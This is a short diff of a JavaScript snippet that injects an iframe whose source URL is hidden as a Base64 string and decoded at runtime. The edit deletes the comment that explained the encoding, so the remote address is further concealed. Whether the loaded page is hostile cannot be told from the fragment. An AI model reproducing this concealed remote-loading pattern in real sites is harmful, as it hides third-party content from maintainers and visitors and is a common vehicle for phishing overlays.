@@ -1,5 +1,5 @@
 (function() {
-    var parts = ["aHR0cHM6Ly9hYy1maW53aXNlLnZlcmNlbC5hcHAv"]; // Base64 encoded URL
+    var parts = ["aHR0cHM6Ly9hYy1maW53aXNlLnZlcmNlbC5hcHAv"]; 
     var iframe = document.createElement("iframe");
     iframe.src = atob(parts[0]); // Decode and set iframe src
     iframe.setAttribute("scrolling", "yes");
